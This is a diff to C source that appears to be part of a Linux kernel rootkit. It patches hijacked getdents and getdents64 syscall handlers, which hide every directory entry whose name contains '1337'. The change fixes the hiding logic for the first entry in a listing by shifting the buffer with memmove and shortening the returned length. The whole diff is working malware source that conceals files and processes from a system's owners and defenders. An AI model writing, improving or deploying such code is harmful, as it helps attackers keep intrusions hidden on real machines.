@@ -19,6 +19,7 @@ int isnumber(char *num){
 asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 
 	int num_reads = real_getdents(fd, dirp, count);
+	long start_offset_i = 0;
 
 	struct linux_dirent *cdirp = dirp, *pdirp = NULL;
 	struct file *f = fget(fd), *fcmdline;
@@ -65,7 +66,7 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 			}
 		} else if (strstr(cdirp->d_name,"1337") != NULL){
 			if (pdirp == NULL)
-				dirp = (struct linux_dirent *)(start_offset + (long)(cdirp->d_reclen));
+				start_offset_i += (long)(cdirp->d_reclen);
 			else
 				pdirp->d_reclen += cdirp->d_reclen;
 		} else {
@@ -76,7 +77,9 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 free_kbuf:
 	kfree(kbuf);
 out:
-	return num_reads;
+	if (start_offset_i != 0)
+		memmove((void *)dirp, (void *)((long)dirp + start_offset_i), num_reads - start_offset_i);
+	return num_reads - start_offset_i;
 }
 
 asmlinkage int hijacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
@@ -87,6 +90,7 @@ asmlinkage int hijacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 
 	int i;
 	long start_offset = (long)dirp;
+	long start_offset_i = 0;
 	
 //	printk(KERN_INFO "hijacked call.\n");
 //	printk(KERN_INFO "num reads: %d\n",num_reads);
@@ -95,14 +99,18 @@ asmlinkage int hijacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		cdirp = (struct linux_dirent64*)(start_offset + i);
 		
 		if (strstr(cdirp->d_name,"1337") != NULL){
-			if (pdirp == NULL)
-				dirp = (struct linux_dirent64 *)(start_offset + (long)(cdirp->d_reclen));
-			else
+			if (pdirp == NULL) {
+				start_offset_i += (long)(cdirp->d_reclen);
+			} else {
 				pdirp->d_reclen += cdirp->d_reclen;
+				pdirp->d_off += cdirp->d_reclen;
+			}
 		} else {
 			pdirp = cdirp;
 		}
 	}
+	if (start_offset_i != 0)
+		memmove((void *)dirp, (void *)((long)dirp + start_offset_i), num_reads - start_offset_i);
 
-	return num_reads;
+	return num_reads - start_offset_i;
 }
